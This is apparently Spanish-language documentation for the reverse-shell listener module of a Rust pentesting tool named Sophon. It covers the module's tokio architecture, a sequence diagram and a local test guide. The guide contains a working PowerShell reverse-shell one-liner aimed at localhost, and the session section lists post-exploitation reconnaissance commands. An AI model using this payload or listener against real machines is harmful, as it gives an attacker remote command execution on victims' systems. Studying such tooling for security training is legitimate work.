# Sophon — Listener (Reverse Shell Catcher)

## Descripción General

El módulo **Listener** permite a Sophon actuar como un receptor de conexiones TCP entrantes,
funcionando de manera equivalente a `netcat -lvnp <puerto>`. Su propósito principal es recibir
**reverse shells**: conexiones iniciadas desde una máquina remota que envían su terminal
(shell) a través de un socket TCP hacia el atacante.

---

## Tabla de Contenidos

- [¿Qué es un Reverse Shell?](#qué-es-un-reverse-shell)
- [Arquitectura Técnica](#arquitectura-técnica)
- [Diagrama de Secuencia](#diagrama-de-secuencia)
- [Uso del Comando](#uso-del-comando)
- [Guía de Pruebas Locales](#guía-de-pruebas-locales)
- [Comandos de Ejemplo](#comandos-de-ejemplo-en-la-sesión)
- [Limitaciones Actuales](#limitaciones-actuales)

---

## ¿Qué es un Reverse Shell?

En un escenario de pentesting, existen dos formas de obtener una terminal remota:

| Tipo          | Dirección de conexión         | ¿Quién inicia?  | Problema                              |
|---------------|-------------------------------|------------------|---------------------------------------|
| **Bind Shell**    | Atacante → Víctima (puerto abierto) | El atacante se conecta | Firewalls bloquean conexiones entrantes |
| **Reverse Shell** | Víctima → Atacante (listener)       | La víctima se conecta  | Evade firewalls (tráfico saliente permitido) |

El **Reverse Shell** invierte la conexión: la máquina comprometida se conecta de vuelta hacia
el atacante, quien tiene un **listener** esperando. La víctima envía su shell (`cmd.exe`,
`/bin/bash`, `powershell`) a través de esa conexión TCP.

Sophon implementa el lado del **listener** (el receptor).

---

## Arquitectura Técnica

### Componentes del Código

| Archivo                          | Responsabilidad                                  |
|----------------------------------|--------------------------------------------------|
| `src/cli.rs`                     | Define el subcomando `listener` y el argumento `--port` |
| `src/commands/listener.rs`       | Lógica principal del listener TCP                |
| `src/commands/mod.rs`            | Exporta el módulo `listener`                     |
| `src/main.rs`                    | Rutea el comando `Listener` hacia `commands::listener::execute()` |

### Flujo de Ejecución Interno

Cuando el usuario ejecuta `sophon listener -p 4444`, ocurre lo siguiente:

1. **Bind** — Se crea un `TcpListener` en `0.0.0.0:<puerto>` usando `tokio::net::TcpListener::bind()`.
   Esto abre un socket en todas las interfaces de red de la máquina.

2. **Accept** — El programa se bloquea asincrónicamente en `listener.accept().await`,
   esperando la primera conexión TCP entrante.

3. **Split** — Una vez aceptada la conexión, el socket TCP se divide en dos mitades
   independientes usando `socket.into_split()`:
   - `sock_read` → mitad de **lectura** (recibe datos del remoto)
   - `sock_write` → mitad de **escritura** (envía datos al remoto)

4. **Piping Bidireccional** — Se lanzan dos tareas asíncronas concurrentes con `tokio::spawn`:

   | Tarea                  | Origen             | Destino           | Propósito                                      |
   |------------------------|--------------------|-------------------|-------------------------------------------------|
   | `remote_to_stdout`     | Socket (lectura)   | `stdout` (pantalla) | Mostrar en pantalla lo que envía la víctima     |
   | `stdin_to_remote`      | `stdin` (teclado)  | Socket (escritura)  | Enviar lo que el atacante escribe hacia la víctima |

5. **Select** — `tokio::select!` espera a que **cualquiera** de las dos tareas termine
   (por ejemplo, si la víctima cierra la conexión, `remote_to_stdout` detecta `Ok(0)` y termina).
   Cuando una tarea finaliza, el programa cierra la sesión.

### Flujo de Datos

```
┌──────────────────────────┐                    ┌──────────────────────────┐
│     ATACANTE (Sophon)    │                    │   VÍCTIMA (Reverse Shell)│
│                          │                    │                          │
│  Teclado (stdin)         │                    │   Shell (cmd / bash)     │
│      │                   │                    │       ▲           │      │
│      ▼                   │    TCP Socket      │       │           ▼      │
│  stdin_to_remote ───────────────────────────────► Ejecuta cmd    │      │
│                          │    Puerto 4444     │       │           │      │
│  remote_to_stdout ◄───────────────────────────────────────────────      │
│      │                   │                    │                          │
│      ▼                   │                    │                          │
│  Pantalla (stdout)       │                    │                          │
└──────────────────────────┘                    └──────────────────────────┘
```

---

## Diagrama de Secuencia

```mermaid
sequenceDiagram
    participant A as Atacante (Sophon)
    participant S as Socket TCP :4444
    participant V as Víctima (Shell)

    Note over A: cargo run -- listener -p 4444

    A->>S: TcpListener::bind("0.0.0.0:4444")
    Note over A: Esperando conexión...

    V->>S: Conexión TCP entrante
    S->>A: listener.accept() → (socket, peer_addr)
    Note over A: [+] Conexión recibida

    A->>A: socket.into_split() → (sock_read, sock_write)
    A->>A: tokio::spawn(remote_to_stdout)
    A->>A: tokio::spawn(stdin_to_remote)

    rect rgb(40, 40, 60)
        Note over A,V: Sesión Interactiva (loop bidireccional)

        A->>S: stdin → sock_write: "whoami\n"
        S->>V: Comando recibido
        V->>V: Ejecuta: whoami
        V->>S: Resultado: "lozada\alexi\n"
        S->>A: sock_read → stdout

        A->>S: stdin → sock_write: "dir\n"
        S->>V: Comando recibido
        V->>V: Ejecuta: dir
        V->>S: Resultado: listado de archivos
        S->>A: sock_read → stdout
    end

    V->>S: Cierra conexión (FIN)
    S->>A: sock_read.read() retorna Ok(0)
    Note over A: [!] Conexión cerrada por el host remoto
    Note over A: [SOPHON] Listener finalizado
```



---

## Uso del Comando

```bash
# Escuchar en el puerto por defecto (4444)
cargo run -- listener

# Escuchar en un puerto específico
cargo run -- listener -p 9001

# Ver la ayuda del comando
cargo run -- listener --help
```

### Argumentos

| Argumento        | Tipo   | Obligatorio | Default | Descripción                      |
|------------------|--------|-------------|---------|----------------------------------|
| `-p`, `--port`   | `u16`  | No          | `4444`  | Puerto local en el que se escucha |

---

## Guía de Pruebas Locales

> **IMPORTANTE:** Todas las pruebas se realizan en tu propia máquina usando `127.0.0.1`
> (localhost). No se necesita ninguna máquina externa ni software adicional.

### Paso 1 — Iniciar el Listener

Abre una terminal y ejecuta:

```bash
cargo run -- listener -p 4444
```

Deberías ver:
```
[SOPHON] Iniciando listener en 0.0.0.0:4444...
[*] Escuchando en el puerto 4444. Esperando conexión...
```

### Paso 2 — Simular la Víctima (Reverse Shell)

Abre una **segunda terminal** (PowerShell) y ejecuta el siguiente script de una sola línea.
Este script conecta PowerShell al listener y ejecuta los comandos que reciba:

```powershell
$client = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $result = (Invoke-Expression $data 2>&1 | Out-String); $prompt = $result + "PS> "; $sendbyte = ([Text.Encoding]::ASCII).GetBytes($prompt); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()
```

### Paso 3 — Ejecutar Comandos

Regresa a la **primera terminal** (Sophon). Deberías ver:
```
[+] Conexión recibida desde 127.0.0.1:XXXXX
```

Ahora escribe cualquier comando y presiona Enter:
```
whoami
```

Verás la respuesta:
```
lozada\alexi
PS>
```

### Paso 4 — Finalizar la Sesión

Para cerrar la conexión tienes dos opciones:
- **Desde el atacante:** Presiona `Ctrl+C` en la terminal de Sophon.
- **Desde la víctima:** Cierra la terminal de PowerShell.

---

## Comandos de Ejemplo en la Sesión

Una vez conectado, puedes ejecutar cualquier comando del sistema operativo de la víctima:

### Reconocimiento del Sistema
```bash
whoami                  # Usuario actual
hostname                # Nombre de la máquina
systeminfo              # Información detallada del sistema
```

### Red
```bash
ipconfig                # Configuración de red
netstat -an             # Conexiones activas
arp -a                  # Tabla ARP
```

### Sistema de Archivos
```bash
dir                     # Listar archivos (Windows)
type archivo.txt        # Leer un archivo (Windows)
cd C:\Users             # Cambiar directorio (Windows)
```

### Procesos
```bash
tasklist                # Listar procesos activos
```

---

## Limitaciones Actuales

| Limitación                    | Descripción                                                                 |
|-------------------------------|-----------------------------------------------------------------------------|
| **Sesión única**              | Solo acepta una conexión. Al desconectarse, el listener termina.           |
| **Sin cifrado**               | La comunicación viaja en texto plano por TCP. No hay TLS/SSL.              |
| **Sin persistencia**          | No se reinicia automáticamente tras una desconexión.                       |
| **Sin logging a archivo**     | La sesión no se guarda en un archivo de log.                                |
| **Sin multi-sesión**          | No puede manejar múltiples víctimas simultáneamente.                       |

### Mejoras Futuras Planificadas

- **Modo persistente:** Reinicio automático del listener tras desconexión.
- **Multi-sesión:** Aceptar N conexiones y cambiar entre ellas (ej. `sessions -l`, `sessions -i 1`).
- **Cifrado TLS:** Proteger la comunicación con certificados auto-firmados.
- **Logging:** Guardar toda la sesión en un archivo con timestamps para auditoría.
